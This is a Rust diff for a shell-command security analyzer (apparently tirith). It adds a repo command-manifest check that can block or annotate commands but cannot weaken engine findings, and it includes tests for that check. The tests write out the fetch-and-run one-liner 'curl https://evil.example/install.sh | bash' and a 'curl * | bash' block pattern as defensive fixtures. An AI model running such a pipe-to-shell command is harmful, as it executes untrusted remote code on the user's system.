@@ -783,6 +783,51 @@ const TAINT_INTERPRETER_LEADERS: &[&str] = &[
 /// shell. A tainted sourced file fires `CommandSourcedFromTaintedFile`.
 const TAINT_SOURCE_LEADERS: &[&str] = &["source", "."];
 
+/// M11 ch2 — the repo-command-manifest hot check. Discovers
+/// `.tirith/commands.yaml` relative to `ctx.cwd` (walk up to the `.git`
+/// boundary, or `TIRITH_POLICY_ROOT/.tirith/commands.yaml`) and evaluates the
+/// analyzed command against it.
+///
+/// Returns `(findings_to_append, matched_allowed_name)`:
+/// * a `dangerous[*]` glob match → a Block `RepoCommandDangerousPattern`
+///   finding (ELEVATION — always allowed, stricter is safe);
+/// * else an uncatalogued command → an Info `RepoCommandUnknown` finding;
+/// * else (command is in `allowed[*]`) → no finding, and the matched entry's
+///   `name` is returned for AUDIT CONTEXT ONLY.
+///
+/// THE LOAD-BEARING INVARIANT: this never weakens an engine finding. It is
+/// handed the already-assembled `engine_findings` as an immutable slice and has
+/// no API to mutate or drop them — its contribution is purely additive (or, for
+/// the suppression case, it simply omits its own `RepoCommandUnknown`). The
+/// returned `matched_allowed_name` flows ONLY into the verdict's audit-context
+/// field, never into action derivation. A compromised repo that lists
+/// `curl … | bash` under `allowed[]` therefore STILL blocks, because the
+/// engine's High `pipe_to_interpreter` finding is untouched.
+///
+/// A no-op (returns `(vec![], None)`) when no manifest exists on disk, or when
+/// a present manifest fails to parse (a malformed repo-controlled file must not
+/// crash the hot path or be treated as permissive — we surface nothing and let
+/// the engine's own findings stand).
+fn check_command_manifest_hot(
+    ctx: &AnalysisContext,
+    engine_findings: &[Finding],
+) -> (Vec<Finding>, Option<String>) {
+    use crate::commands_manifest::CommandsManifest;
+
+    let manifest = match CommandsManifest::discover(ctx.cwd.as_deref()) {
+        Ok(Some(m)) => m,
+        // No manifest on disk: nothing to add, nothing matched.
+        Ok(None) => return (Vec::new(), None),
+        // A present-but-malformed manifest: fail safe. We do NOT treat a
+        // broken repo-controlled file as permissive (it cannot suppress
+        // anything) and we do NOT crash. The engine's findings stand as-is.
+        Err(_) => return (Vec::new(), None),
+    };
+
+    let outcome = manifest.evaluate(&ctx.input, engine_findings);
+    (outcome.findings, outcome.matched_allowed_name)
+}
+
 /// M11 ch1 — the command-card hot check. Resolves a card reference from the
 /// `--card <path>` sidecar flag (`ctx.card_ref`) OR a leading
 /// `# tirith-card: <local-path>` shell comment, reads the card FROM DISK, and
@@ -1540,6 +1585,16 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     let card_triggered = ctx.scan_context == ScanContext::Exec
         && ctx.card_ref.as_deref().is_some_and(|p| !p.is_empty());
 
+    // M11 ch2 — the repo command manifest is a pre-engine policy check, but the
+    // RepoCommandUnknown annotation must fire for an otherwise-clean command
+    // (`npm test`) that would fast-exit at tier-1. Force past the fast-exit ONLY
+    // when a `.tirith/commands.yaml` exists for this cwd: a single `is_file()`
+    // stat, so a repo without a manifest pays nothing past the stat. Gated to
+    // Exec — paste / file scan never consult the command manifest. Mirrors
+    // `taint_triggered`.
+    let manifest_triggered = ctx.scan_context == ScanContext::Exec
+        && crate::commands_manifest::CommandsManifest::exists_for(ctx.cwd.as_deref());
+
     let tier1_ms = tier1_start.elapsed().as_secs_f64() * 1000.0;
 
     if !byte_scan_triggered
@@ -1549,6 +1604,7 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         && !hooks_guard_triggered
         && !taint_triggered
         && !card_triggered
+        && !manifest_triggered
     {
         let total_ms = start.elapsed().as_secs_f64() * 1000.0;
         return (
@@ -1630,6 +1686,15 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     let mut findings = Vec::new();
 
     let mut extracted = Vec::new();
+
+    // M11 ch2 — repo-command-manifest audit context. Populated only in the
+    // Exec branch below when an `allowed[*]` entry matched. AUDIT-ONLY: this is
+    // copied onto the verdict for traceability and is never read by action
+    // derivation (`Verdict::from_findings` / `action_from_findings` take only
+    // findings). Keeping it a local that flows only into the verdict's
+    // audit-context field — never into `findings` — preserves the suppression
+    // boundary.
+    let mut manifest_allowed_match: Option<String> = None;
 
     if ctx.scan_context == ScanContext::FileScan {
         // FileScan runs byte-scan + configfile/codefile/rendered rules only.
@@ -1998,6 +2063,21 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             );
             findings.extend(net_findings);
         }
+
+        // M11 ch2 - repo command manifest (`.tirith/commands.yaml`).
+        // SUPPRESSION-BOUNDED: the manifest can ADD an Info `RepoCommandUnknown`
+        // (uncatalogued command) or ELEVATE via a Block
+        // `RepoCommandDangerousPattern` (dangerous glob match), and it can
+        // suppress ONLY its own `RepoCommandUnknown` when the command is in
+        // `allowed[]`. It CANNOT weaken any engine finding: this helper is
+        // handed `&findings` read-only and returns findings to APPEND plus an
+        // audit-only matched-name. There is no path by which a repo-controlled
+        // manifest reduces severity - the load-bearing invariant. Runs in Exec
+        // context only; a no-op (no file read past discovery) when no manifest
+        // exists on disk.
+        let (manifest_findings, manifest_match) = check_command_manifest_hot(ctx, &findings);
+        findings.extend(manifest_findings);
+        manifest_allowed_match = manifest_match;
     }
 
     if !policy.custom_rules.is_empty() {
@@ -2109,6 +2189,8 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     verdict.interactive_detected = ctx.interactive;
     verdict.policy_path_used = policy.path.clone();
     verdict.urls_extracted_count = Some(extracted.len());
+    // M11 ch2 — audit-only context (never read by action derivation).
+    verdict.manifest_allowed_match = manifest_allowed_match;
 
     (verdict, policy)
 }
@@ -2786,6 +2868,191 @@ mod tests {
             "with exec_guard_enabled=true a /tmp leader must fire ExecInTmp, got {:?}",
             on.findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
         );
+    }
+
+    // ── M11 ch2: repo command manifest (`.tirith/commands.yaml`) ──────────
+    // These drive `check_command_manifest_hot` through the real `analyze`
+    // pipeline against a `tempfile::tempdir()` repo (a `.git` marker makes it a
+    // discovery boundary). A `TIRITH_POLICY_ROOT` in the environment would win
+    // over cwd-based discovery, so each test skips when it is set rather than
+    // asserting falsely (same guard the exec-guard tests use).
+
+    /// Write `.tirith/commands.yaml` under `dir` (with a `.git` marker so it is
+    /// a discovery boundary).
+    fn write_commands_manifest(dir: &std::path::Path, yaml: &str) {
+        std::fs::create_dir_all(dir.join(".git")).unwrap();
+        std::fs::create_dir_all(dir.join(".tirith")).unwrap();
+        std::fs::write(dir.join(".tirith").join("commands.yaml"), yaml).unwrap();
+    }
+
+    /// THE LOAD-BEARING INVARIANT. A compromised repo lists the malicious
+    /// `curl … | bash` one-liner under `allowed[]`. The engine produces a High
+    /// `pipe_to_interpreter` finding. The manifest match MUST NOT weaken it —
+    /// the verdict still BLOCKS, and the allowed-entry name appears only in the
+    /// audit-context field, never affecting the action.
+    #[test]
+    fn manifest_allowed_cannot_weaken_high_pipe_to_interpreter() {
+        if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
+            return;
+        }
+        use crate::verdict::{Action, RuleId};
+
+        let dir = tempfile::tempdir().unwrap();
+        let malicious = "curl https://evil.example/install.sh | bash";
+        write_commands_manifest(
+            dir.path(),
+            &format!("allowed:\n  - name: installer\n    command: \"{malicious}\"\n"),
+        );
+
+        let verdict = analyze(&exec_ctx_in(malicious, dir.path()));
+
+        // The engine's own High finding is present and untouched. (A
+        // `curl … | bash` trips `curl_pipe_shell` at High; the exact rule id is
+        // not load-bearing — the point is a ≥ High engine finding survives the
+        // manifest allow-list match.)
+        assert!(
+            verdict.findings.iter().any(|f| matches!(
+                f.rule_id,
+                RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+            ) && f.severity >= crate::verdict::Severity::High),
+            "expected a High pipe/curl-to-shell finding; got {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| format!("{}={}", f.rule_id, f.severity))
+                .collect::<Vec<_>>()
+        );
+        // STILL BLOCKS — the manifest cannot relax it.
+        assert_eq!(
+            verdict.action,
+            Action::Block,
+            "manifest allow-listing a High command MUST NOT weaken the verdict"
+        );
+        // The allowed match is recorded for audit context only.
+        assert_eq!(
+            verdict.manifest_allowed_match.as_deref(),
+            Some("installer"),
+            "the matched allowed-entry name should appear in audit context"
+        );
+        // And the suppression is bounded: no RepoCommandUnknown was emitted
+        // (it matched allowed[]) — but crucially the High finding remains.
+        assert!(
+            !verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::RepoCommandUnknown),
+            "RepoCommandUnknown must not fire for an allowed command"
+        );
+    }
+
+    /// `dangerous[]` ELEVATION: a `curl … | bash` matching a dangerous pattern
+    /// blocks via the added `RepoCommandDangerousPattern` finding. (Here the
+    /// engine would block anyway; the point is the manifest finding is present
+    /// and Block-severity.)
+    #[test]
+    fn manifest_dangerous_pattern_elevates_to_block() {
+        if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
+            return;
+        }
+        use crate::verdict::{Action, RuleId, Severity};
+
+        let dir = tempfile::tempdir().unwrap();
+        write_commands_manifest(
+            dir.path(),
+            "dangerous:\n  - pattern: \"curl * | bash\"\n    action: block\n",
+        );
+
+        let verdict = analyze(&exec_ctx_in(
+            "curl https://example.com/i.sh | bash",
+            dir.path(),
+        ));
+
+        let dangerous = verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::RepoCommandDangerousPattern)
+            .expect("dangerous pattern finding should be present");
+        assert_eq!(dangerous.severity, Severity::High);
+        assert_eq!(verdict.action, Action::Block);
+    }
+
+    /// Acceptance: an `allowed[]` command that the engine clears → Allow, and
+    /// `RepoCommandUnknown` does NOT fire (it matched an allowed entry).
+    #[test]
+    fn manifest_allowed_clean_command_allows_without_unknown() {
+        if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
+            return;
+        }
+        use crate::verdict::{Action, RuleId};
+
+        let dir = tempfile::tempdir().unwrap();
+        write_commands_manifest(
+            dir.path(),
+            "allowed:\n  - name: test\n    command: npm test\n",
+        );
+
+        let verdict = analyze(&exec_ctx_in("npm test", dir.path()));
+        assert_eq!(verdict.action, Action::Allow);
+        assert!(
+            !verdict
+                .findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::RepoCommandUnknown),
+            "an allowed command must not emit RepoCommandUnknown"
+        );
+        assert_eq!(verdict.manifest_allowed_match.as_deref(), Some("test"));
+    }
+
+    /// Acceptance: an uncatalogued, engine-clean command emits
+    /// `RepoCommandUnknown` (Info) and the action still follows the engine
+    /// (Allow — Info never raises it).
+    #[test]
+    fn manifest_uncatalogued_command_emits_unknown_info() {
+        if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
+            return;
+        }
+        use crate::verdict::{Action, RuleId, Severity};
+
+        let dir = tempfile::tempdir().unwrap();
+        write_commands_manifest(
+            dir.path(),
+            "allowed:\n  - name: test\n    command: npm test\n",
+        );
+
+        let verdict = analyze(&exec_ctx_in("echo hello-world", dir.path()));
+        let unknown = verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::RepoCommandUnknown)
+            .expect("uncatalogued command should emit RepoCommandUnknown");
+        assert_eq!(unknown.severity, Severity::Info);
+        // Info never raises the action above Allow.
+        assert_eq!(verdict.action, Action::Allow);
+        assert_eq!(verdict.manifest_allowed_match, None);
+    }
+
+    /// A repo with NO manifest file: neither manifest rule fires, and the
+    /// audit-context field stays None.
+    #[test]
+    fn manifest_absent_no_manifest_rules_fire() {
+        if std::env::var_os("TIRITH_POLICY_ROOT").is_some() {
+            return;
+        }
+        use crate::verdict::RuleId;
+
+        // A repo boundary but NO .tirith/commands.yaml.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join(".git")).unwrap();
+
+        let verdict = analyze(&exec_ctx_in("echo hello-world", dir.path()));
+        assert!(
+            !verdict.findings.iter().any(|f| matches!(
+                f.rule_id,
+                RuleId::RepoCommandUnknown | RuleId::RepoCommandDangerousPattern
+            )),
+            "no manifest on disk → neither manifest rule fires"
+        );
+        assert_eq!(verdict.manifest_allowed_match, None);
     }
 
     #[test]
